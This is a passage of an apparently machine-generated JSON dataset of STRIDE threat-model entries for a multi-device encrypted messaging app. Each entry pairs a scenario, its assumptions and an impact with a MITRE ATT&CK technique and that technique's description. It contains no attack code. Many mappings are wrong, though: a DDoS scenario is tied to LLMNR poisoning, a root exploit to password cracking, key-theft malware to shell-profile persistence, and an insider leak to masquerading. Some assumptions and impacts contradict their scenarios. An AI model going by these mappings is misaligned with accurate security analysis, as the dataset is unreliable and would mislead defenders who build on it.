            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies the database files on the primary or companion devices to alter stored message history or pre-keys.",
            "Assumptions": [
                {
                    "Assumption": "Database files are accessible on compromised device.",
                    "Role": "Attacker",
                    "Condition": "Attacker has physical or remote access."
                },
                {
                    "Assumption": "Database encryption is not robust or is bypassable.",
                    "Role": "Application Developer",
                    "Condition": "Encryption is weak or implementation is flawed."
                },
                {
                    "Assumption": "Adequate logging and alerting mechanisms are not in place.",
                    "Role": "System Administrator",
                    "Condition": "Lack of monitoring for unauthorized changes."
                }
            ],
            "Potential Impact": "Data corruption and loss of message integrity.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "data corruption",
                "database",
                "data access"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies sending a specific message by claiming their account was compromised.",
            "Assumptions": [
                {
                    "Assumption": "Account lacks non-repudiation mechanisms.",
                    "Role": "Application Developer",
                    "Condition": "Non-repudiation features are not implemented."
                },
                {
                    "Assumption": "Audit logs do not capture sufficient details.",
                    "Role": "System Administrator",
                    "Condition": "Logging is insufficient or flawed."
                },
                {
                    "Assumption": "User behavior cannot be definitively tied to account actions.",
                    "Role": "Security Analyst",
                    "Condition": "Lack of user behavior analytics."
                }
            ],
            "Potential Impact": "Dispute of message authenticity and potential legal issues.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "non-repudiation",
                "user action",
                "audit logs"
            ],
            "mitre_technique": {
                "name": "Indicator Removal",
                "description": "Adversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses. Various artifacts may be created by an adversary or something that can be attributed to an adversary\u2019s actions. Typically these artifacts are used as defensive indicators related to monitored events, such as strings from downloaded files, logs that are generated from user actions, and other data analyzed by defenders. Location, format, and type of artifact (such as command or login history) are often specific to each platform.\n\nRemoval of these indicators may interfere with event collection, reporting, or other processes used to detect intrusion activity. This may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.",
                "id": "attack-pattern--799ace7f-e227-4411-baa0-8868704f2a69",
                "technique_id": "T1070"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker manipulates logs to prevent tracking of malicious actions taken using a compromised account.",
            "Assumptions": [
                {
                    "Assumption": "Attacker can access and modify log files.",
                    "Role": "Attacker",
                    "Condition": "Attacker has elevated access rights."
                },
                {
                    "Assumption": "Logs are not tamper-evident or protected.",
                    "Role": "System Administrator",
                    "Condition": "Logs are stored without integrity protections."
                },
                {
                    "Assumption": "Real-time monitoring of logs is not implemented.",
                    "Role": "Security Operations",
                    "Condition": "Lack of monitoring tools or alerts."
                }
            ],
            "Potential Impact": "Loss of traceability and forensic evidence.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "log manipulation",
                "forensic analysis",
                "data integrity"
            ],
            "mitre_technique": {
                "name": "Indicator Removal",
                "description": "Adversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses. Various artifacts may be created by an adversary or something that can be attributed to an adversary\u2019s actions. Typically these artifacts are used as defensive indicators related to monitored events, such as strings from downloaded files, logs that are generated from user actions, and other data analyzed by defenders. Location, format, and type of artifact (such as command or login history) are often specific to each platform.\n\nRemoval of these indicators may interfere with event collection, reporting, or other processes used to detect intrusion activity. This may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.",
                "id": "attack-pattern--799ace7f-e227-4411-baa0-8868704f2a69",
                "technique_id": "T1070"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A malicious user uses anonymous communication channels to send harmful messages and denies involvement.",
            "Assumptions": [
                {
                    "Assumption": "Platform supports anonymous messaging.",
                    "Role": "Application Developer",
                    "Condition": "Application allows anonymous communications."
                },
                {
                    "Assumption": "Account creation does not require strong identity verification.",
                    "Role": "Application Developer",
                    "Condition": "Weak or non-existent identity verification processes."
                },
                {
                    "Assumption": "Messages sent through the platform do not have strong authentication.",
                    "Role": "User",
                    "Condition": "Lack of message-signing mechanisms."
                }
            ],
            "Potential Impact": "Harmful actions without accountability.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "anonymous communication",
                "message authentication",
                "user behaviour"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker gains unauthorized access to message contents through vulnerabilities in the encryption protocol.",
            "Assumptions": [
                {
                    "Assumption": "The encryption protocol has exploitable weaknesses.",
                    "Role": "Application Developer",
                    "Condition": "Protocol implementation is not secure."
                },
                {
                    "Assumption": "Attacker is able to intercept network traffic.",
                    "Role": "Attacker",
                    "Condition": "Attacker has network access."
                },
                {
                    "Assumption": "Decryption keys can be compromised.",
                    "Role": "User",
                    "Condition": "User fails to protect private keys."
                }
            ],
            "Potential Impact": "Disclosure of sensitive message contents.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "encryption attack",
                "network interception",
                "decryption"
            ],
            "mitre_technique": {
                "name": "Weaken Encryption",
                "description": "Adversaries may compromise a network device\u2019s encryption capability in order to bypass encryption that would otherwise protect data communications. (Citation: Cisco Synful Knock Evolution)\n\nEncryption can be used to protect transmitted network traffic to maintain its confidentiality (protect against unauthorized disclosure) and integrity (protect against unauthorized changes). Encryption ciphers are used to convert a plaintext message to ciphertext and can be computationally intensive to decipher without the associated decryption key. Typically, longer keys increase the cost of cryptanalysis, or decryption without the key.\n\nAdversaries can compromise and manipulate devices that perform encryption of network traffic. For example, through behaviors such as [Modify System Image](https://attack.mitre.org/techniques/T1601), [Reduce Key Space](https://attack.mitre.org/techniques/T1600/001), and [Disable Crypto Hardware](https://attack.mitre.org/techniques/T1600/002), an adversary can negatively effect and/or eliminate a device\u2019s ability to securely encrypt network traffic. This poses a greater risk of unauthorized disclosure and may help facilitate data manipulation, Credential Access, or Collection efforts. (Citation: Cisco Blog Legacy Device Attacks)",
                "id": "attack-pattern--1f9012ef-1e10-4e48-915e-e03563435fe8",
                "technique_id": "T1600"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Keys stored on the primary or companion devices are exfiltrated by malware.",
            "Assumptions": [
                {
                    "Assumption": "Devices are vulnerable to malware intrusions.",
                    "Role": "User",
                    "Condition": "User does not have up-to-date anti-malware protection."
                },
                {
                    "Assumption": "Keys are not stored securely.",
                    "Role": "Application Developer",
                    "Condition": "Key storage mechanisms are weak."
                },
                {
                    "Assumption": "Malware can maintain persistence on the device.",
                    "Role": "Attacker",
                    "Condition": "Persistent malware could be installed."
                }
            ],
            "Potential Impact": "Unauthorized access to encrypted data.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "malware",
                "key exfiltration",
                "device"
            ],
            "mitre_technique": {
                "name": "Malicious Shell Modification",
                "description": "Adversaries may establish persistence through executing malicious commands triggered by a user\u2019s shell. User shells execute several configuration scripts at different points throughout the session based on events. For example, when a user opens a command line interface or remotely logs in (such as SSH) a login shell is initiated. The login shell executes scripts from the system (/etc) and the user\u2019s home directory (~/) to configure the environment. All login shells on a system use <code>/etc/profile</code> when initiated. These configuration scripts run at the permission level of their directory and are often used to set environment variables, create aliases, and customize the user\u2019s environment. When the shell exits or terminates, additional shell scripts are executed to ensure the shell exits appropriately. \n\nAdversaries may attempt to establish persistence by inserting commands into scripts automatically executed by shells. Using bash as an example, the default shell for most GNU/Linux systems, adversaries may add commands that launch malicious binaries into the <code>/etc/profile</code> and <code>/etc/profile.d</code> files (Citation: intezer-kaiji-malware). These files require root permissions and are executed each time any shell on a system launches. For user level permissions, adversaries can insert malicious commands into <code>~/.bash_profile</code>, <code>~/.bash_login</code>, or <code>~/.profile</code> (Rocke) which are sourced when a user opens a command line interface or connects remotely. Adversaries often use ~/.bash_profile since the system only executes the first file that exists in the listed order. Adversaries have also leveraged the <code>~/.bashrc</code> file (Tsunami, Rocke, Linux Rabbit, Magento) which is additionally executed if the connection is established remotely or an additional interactive shell is opened, such as a new tab in the command line interface. Some malware targets the termination of a program to trigger execution (Cannon), adversaries can use the <code>~/.bash_logout</code> file to execute malicious commands at the end of a session(Pearl_shellbot). \n\nFor macOS, the functionality of this technique is similar but leverages zsh, the default shell for macOS 10.15+. When the Terminal.app is opened, the application launches a zsh login shell and a zsh interactive shell. The login shell configures the system environment using <code>/etc/profile</code>, <code>/etc/zshenv</code>, <code>/etc/zprofile</code>, and <code>/etc/zlogin</code>. The login shell then configures the user environment with <code>~/.zprofile</code> and <code>~/.zlogin</code>. The interactive shell uses the <code>~/.zshrc<code> to configure the user environment. Upon exiting, <code>/etc/zlogout</code> and <code>~/.zlogout</code> are executed. For legacy programs, macOS executes <code>/etc/bashrc</code> on startup.",
                "id": "attack-pattern--01df3350-ce05-4bdf-bdf8-0a919a66d4a8",
                "technique_id": "T1156"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An insider threat leaks sensitive communications and associated metadata to unauthorized parties.",
            "Assumptions": [
                {
                    "Assumption": "Insiders have access to sensitive information.",
                    "Role": "Insider",
                    "Condition": "Employee or contractor has legitimate access."
                },
                {
                    "Assumption": "Access controls and monitoring mechanisms are inadequate.",
                    "Role": "System Administrator",
                    "Condition": "Lack of robust access management."
                },
                {
                    "Assumption": "Motivation for malicious actions exists.",
                    "Role": "Insider",
                    "Condition": "Disgruntled or compromised insider."
                }
            ],
            "Potential Impact": "Confidentiality breach and loss of sensitive data.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "insider threat",
                "data leakage",
                "metadata"
            ],
            "mitre_technique": {
                "name": "Masquerading",
                "description": "Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.\n\nRenaming abusable system utilities to evade security monitoring is also a form of [Masquerading](https://attack.mitre.org/techniques/T1036).(Citation: LOLBAS Main Site)",
                "id": "attack-pattern--42e8de7b-37b2-4258-905a-6897815e58e0",
                "technique_id": "T1036"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker launches a DDoS attack to overwhelm the messaging server, causing outages and preventing legitimate users from accessing the service.",
            "Assumptions": [
                {
                    "Assumption": "Servers are publicly accessible over the internet.",
                    "Role": "System Administrator",
                    "Condition": "Public-facing servers."
                },
                {
                    "Assumption": "Attacker possesses the means to launch a large-scale DDoS attack.",
                    "Role": "Attacker",
                    "Condition": "Access to botnets or other resources."
                },
                {
                    "Assumption": "Bandwidth over-provisioning or rate limiting is insufficient.",
                    "Role": "Service Provider",
                    "Condition": "Lack of adequate DDoS protection measures."
                }
            ],
            "Potential Impact": "Disruption of service availability.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "DDoS",
                "server",
                "network"
            ],
            "mitre_technique": {
                "name": "LLMNR/NBT-NS Poisoning and Relay",
                "description": "Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name. (Citation: Wikipedia LLMNR) (Citation: TechNet NetBIOS)\n\nAdversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through [Network Sniffing](https://attack.mitre.org/techniques/T1040) and crack the hashes offline through [Brute Force](https://attack.mitre.org/techniques/T1110) to obtain the plaintext passwords. In some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it. (Citation: byt3bl33d3r NTLM Relaying)(Citation: Secure Ideas SMB Relay)\n\nSeveral tools exist that can be used to poison name services within local networks such as NBNSpoof, Metasploit, and [Responder](https://attack.mitre.org/software/S0174). (Citation: GitHub NBNSpoof) (Citation: Rapid7 LLMNR Spoofer) (Citation: GitHub Responder)",
                "id": "attack-pattern--0dbf5f1b-a560-4d51-ac1b-d70caab3e1f0",
                "technique_id": "T1171"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker exploits a vulnerability in the messaging application to cause it to crash or become unresponsive.",
            "Assumptions": [
                {
                    "Assumption": "Application contains exploitable vulnerabilities.",
                    "Role": "Application Developer",
                    "Condition": "Coding flaws or insufficient testing."
                },
                {
                    "Assumption": "Users regularly update their applications.",
                    "Role": "User",
                    "Condition": "Users install app updates promptly."
                },
                {
                    "Assumption": "Vulnerability is publicly known or discovered.",
                    "Role": "Attacker",
                    "Condition": "Active reconnaissance and exploitation."
                }
            ],
            "Potential Impact": "Temporary loss of service functionality.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "application crash",
                "vulnerability exploitation",
                "software"
            ],
            "mitre_technique": {
                "name": "Application Exhaustion Flood",
                "description": "Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)",
                "id": "attack-pattern--18cffc21-3260-437e-80e4-4ab8bf2ba5e9",
                "technique_id": "T1499.003"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A malicious companion device sends a flood of malformed requests to the primary device, leading to resource exhaustion.",
            "Assumptions": [
                {
                    "Assumption": "Companion devices have direct communication channels to the primary device.",
                    "Role": "Application Developer",
                    "Condition": "Linked devices with trusted communication."
                },
                {
                    "Assumption": "Malformed requests are not adequately filtered.",
                    "Role": "System Administrator",
                    "Condition": "Insufficient input validation and rate-limiting."
                },
                {
                    "Assumption": "Primary device is not designed to handle high volumes of unexpected traffic.",
                    "Role": "Device Manufacturer",
                    "Condition": "Limited hardware or software resources."
                }
            ],
            "Potential Impact": "Primary device becomes unresponsive, disrupting communication.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "resource exhaustion",
                "device communication",
                "malformed requests"
            ],
            "mitre_technique": {
                "name": "Application Exhaustion Flood",
                "description": "Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)",
                "id": "attack-pattern--18cffc21-3260-437e-80e4-4ab8bf2ba5e9",
                "technique_id": "T1499.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a software vulnerability to gain root access on a primary or companion device.",
            "Assumptions": [
                {
                    "Assumption": "Devices run software with exploitable vulnerabilities.",
                    "Role": "Device Manufacturer",
                    "Condition": "Outdated or improperly secured software."
                },
                {
                    "Assumption": "Attacker has initial access to the device.",
                    "Role": "Attacker",
                    "Condition": "Physical or logical access."
                },
                {
                    "Assumption": "Security patches are not promptly applied.",
                    "Role": "User",
                    "Condition": "Delay in applying updates."
                }
            ],
            "Potential Impact": "Full control over the device, leading to total system compromise.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "root access",
                "device",
                "vulnerability exploitation"
            ],
            "mitre_technique": {
                "name": "Password Cracking",
                "description": "Adversaries may use password cracking to attempt to recover usable credentials, such as plaintext passwords, when credential material such as password hashes are obtained. [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) can be used to obtain password hashes, this may only get an adversary so far when [Pass the Hash](https://attack.mitre.org/techniques/T1550/002) is not an option. Further,  adversaries may leverage [Data from Configuration Repository](https://attack.mitre.org/techniques/T1602) in order to obtain hashed credentials for network devices.(Citation: US-CERT-TA18-106A) \n\nTechniques to systematically guess the passwords used to compute hashes are available, or the adversary may use a pre-computed rainbow table to crack hashes. Cracking hashes is usually done on adversary-controlled systems outside of the target network.(Citation: Wikipedia Password cracking) The resulting plaintext password resulting from a successfully cracked hash may be used to log into systems, resources, and services in which the account has access.",
                "id": "attack-pattern--1d24cdee-9ea2-4189-b08e-af110bf2435d",
                "technique_id": "T1110.002"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker leverages a misconfigured access control policy to gain administrator privileges on the messaging server.",
            "Assumptions": [
                {
                    "Assumption": "Access control policies are misconfigured.",
                    "Role": "System Administrator",
                    "Condition": "Inadequate configuration management."
                },
                {
                    "Assumption": "Attacker has access to an account with elevated permissions.",
                    "Role": "Attacker",
                    "Condition": "Stolen or brute-forced credentials."
                },
                {
                    "Assumption": "Logs and alerts for privilege escalations are not monitored.",
                    "Role": "Security Operations",
                    "Condition": "Lax monitoring and incident response."
                }
            ],
            "Potential Impact": "Unauthorized administrative control, leading to extensive system changes.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "misconfiguration",
                "access control",
                "server"
            ],
            "mitre_technique": {
                "name": "Services Registry Permissions Weakness",
                "description": "Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Adversaries may use flaws in the permissions for Registry keys related to services to redirect from the originally specified executable to one that they control, in order to launch their own code when a service starts. Windows stores local service configuration information in the Registry under <code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code>. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe,  [PowerShell](https://attack.mitre.org/techniques/T1059/001), or [Reg](https://attack.mitre.org/software/S0075). Access to Registry keys is controlled through access control lists and user permissions. (Citation: Registry Key Security)(Citation: malware_hides_service)\n\nIf the permissions for users and groups are not properly set and allow access to the Registry keys for a service, adversaries may change the service's binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to establish persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).\n\nAdversaries may also alter other Registry keys in the service\u2019s Registry tree. For example, the <code>FailureCommand</code> key may be changed so that the service is executed in an elevated context anytime the service fails or is intentionally corrupted.(Citation: Kansa Service related collectors)(Citation: Tweet Registry Perms Weakness)\n\nThe <code>Performance</code> key contains the name of a driver service's performance DLL and the names of several exported functions in the DLL.(Citation: microsoft_services_registry_tree) If the <code>Performance</code> key is not already present and if an adversary-controlled user has the <code>Create Subkey</code> permission, adversaries may create the <code>Performance</code> key in the service\u2019s Registry tree to point to a malicious DLL.(Citation: insecure_reg_perms)\n\nAdversaries may also add the <code>Parameters</code> key, which stores driver-specific data, or other custom subkeys for their malicious services to establish persistence or enable other malicious activities.(Citation: microsoft_services_registry_tree)(Citation: troj_zegost) Additionally, If adversaries launch their malicious services using svchost.exe, the service\u2019s file may be identified using <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\servicename\\Parameters\\ServiceDll</code>.(Citation: malware_hides_service)",
                "id": "attack-pattern--17cc750b-e95b-4d7d-9dde-49e0de24148c",
                "technique_id": "T1574.011"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a flaw in the application code to escalate privileges from a standard user to an admin account within the messaging application.",
            "Assumptions": [
                {
                    "Assumption": "The application has privilege escalation vulnerabilities.",
                    "Role": "Application Developer",
                    "Condition": "Coding errors or insecure design."
                },
                {
                    "Assumption": "Attacker has a standard user account.",
                    "Role": "Attacker",
                    "Condition": "Valid user credentials."
                },
                {
                    "Assumption": "Privilege escalation flaws are known or discoverable.",
                    "Role": "Attacker",
                    "Condition": "Availability of exploits or reconnaissance."
                }
            ],
            "Potential Impact": "Unauthorized access to administrative functions.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "application vulnerability",
                "user account",
                "application code"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        }
    ]
},
{
    "case_number": "13",
    "batch_number": "12",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker creates a fake messaging application that mimics the look and feel of a legitimate app to steal user credentials.",
            "Assumptions": [
                {
                    "Assumption": "Users may download applications from unofficial sources.",
                    "Role": "End users",
                    "Condition": "Valid if users do not check the authenticity of the application source."
                },
                {
                    "Assumption": "Attackers have the capability to design convincingly similar interfaces.",
                    "Role": "Attackers",
                    "Condition": "Valid if attackers have sufficient skills and resources."
                },
                {
                    "Assumption": "Public/Private key pairs are not checked during initial setup.",
                    "Role": "End users",
                    "Condition": "Valid if users bypass or ignore security warnings."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive information.",
            "MITRE ATT&CK Keywords": [
                "Credential Access",
                "Spearphishing",
                "Spoofing",
                "User Interface"
            ],
            "mitre_technique": {
                "name": "Malicious File",
                "description": "An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001). Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl.\n\nAdversaries may employ various forms of [Masquerading](https://attack.mitre.org/techniques/T1036) and [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to increase the likelihood that a user will open and successfully execute a malicious file. These methods may include using a familiar naming convention and/or password protecting the file and supplying instructions to a user on how to open it.(Citation: Password Protected Word Docs) \n\nWhile [Malicious File](https://attack.mitre.org/techniques/T1204/002) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).",
                "id": "attack-pattern--232b7f21-adf9-4b42-b936-b9d6f7df856e",
                "technique_id": "T1204.002"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker gains access to a user's primary device, generating fake identity keys and impersonating the user to their contacts.",
            "Assumptions": [
                {
                    "Assumption": "The primary device can be physically accessed by the attacker.",
                    "Role": "End users",
                    "Condition": "Valid when users leave their devices unattended or unsecured."
                },
                {
                    "Assumption": "The attacker can generate identity keys without detection.",
                    "Role": "Attackers",
                    "Condition": "Valid if the application lacks robust identity verification mechanisms."
                },
                {
                    "Assumption": "Effective encryption protocols can be bypassed if keys are compromised.",
                    "Role": "Attackers",
                    "Condition": "Valid when keys are stored in an unprotected manner."
                }
            ],
            "Potential Impact": "Corruption or tampering of data.",
            "MITRE ATT&CK Keywords": [
                "Identity Theft",
                "Key Generation",
                "Device Access",
                "Spoofing"
            ],
            "mitre_technique": {
                "name": "Device Registration",
                "description": "Adversaries may register a device to an adversary-controlled account. Devices may be registered in a multifactor authentication (MFA) system, which handles authentication to the network, or in a device management system, which handles device access and compliance.\n\nMFA systems, such as Duo or Okta, allow users to associate devices with their accounts in order to complete MFA requirements. An adversary that compromises a user\u2019s credentials may enroll a new device in order to bypass initial MFA requirements and gain persistent access to a network.(Citation: CISA MFA PrintNightmare)(Citation: DarkReading FireEye SolarWinds) In some cases, the MFA self-enrollment process may require only a username and password to enroll the account's first device or to enroll a device to an inactive account. (Citation: Mandiant APT29 Microsoft 365 2022)\n\nSimilarly, an adversary with existing access to a network may register a device to Azure AD and/or its device management system, Microsoft Intune, in order to access sensitive data or resources while bypassing conditional access policies.(Citation: AADInternals - Device Registration)(Citation: AADInternals - Conditional Access Bypass)(Citation: Microsoft DEV-0537) \n\nDevices registered in Azure AD may be able to conduct [Internal Spearphishing](https://attack.mitre.org/techniques/T1534) campaigns via intra-organizational emails, which are less likely to be treated as suspicious by the email client.(Citation: Microsoft - Device Registration) Additionally, an adversary may be able to perform a [Service Exhaustion Flood](https://attack.mitre.org/techniques/T1499/002) on an Azure AD tenant by registering a large number of devices.(Citation: AADInternals - BPRT)",
                "id": "attack-pattern--7decb26c-715c-40cf-b7e0-026f7d7cc215",
                "technique_id": "T1098.005"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses a compromised desktop client to pose as a trusted device, intercepting messages meant for the legitimate user.",
            "Assumptions": [
                {
                    "Assumption": "The desktop client can be compromised by malware.",
                    "Role": "Attackers",
                    "Condition": "Valid if the client's security measures fail."
                },
                {
                    "Assumption": "The attacker can manipulate network traffic undetected.",
                    "Role": "Attackers",
                    "Condition": "Valid if network traffic is not properly encrypted."
                },
                {
                    "Assumption": "Companion devices do not require periodic re-authentication.",
                    "Role": "End users",
                    "Condition": "Valid if companion devices are trusted indefinitely after initial setup."
                }
            ],
            "Potential Impact": "Disruption to system or data access.",
            "MITRE ATT&CK Keywords": [
                "Man-in-the-Middle",
                "Network Traffic",
                "Device Spoofing",
                "Eavesdropping"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies the encrypted SQLite databases used by the messaging apps to inject malicious data.",
            "Assumptions": [
                {
                    "Assumption": "SQLite databases can be accessed and modified by attackers.",
                    "Role": "Attackers",
                    "Condition": "Valid if databases are not adequately encrypted or protected."
                },
                {
                    "Assumption": "Users are unaware of the modifications made to the database.",
                    "Role": "End users",
                    "Condition": "Valid if the application does not verify the integrity of the database."
                },
                {
                    "Assumption": "The application does not flag abnormal database activities.",
                    "Role": "Application developers",
                    "Condition": "Valid if there are no safeguards against unexpected changes."
                }
            ],
            "Potential Impact": "Corruption or tampering of data.",
            "MITRE ATT&CK Keywords": [
                "Database Manipulation",
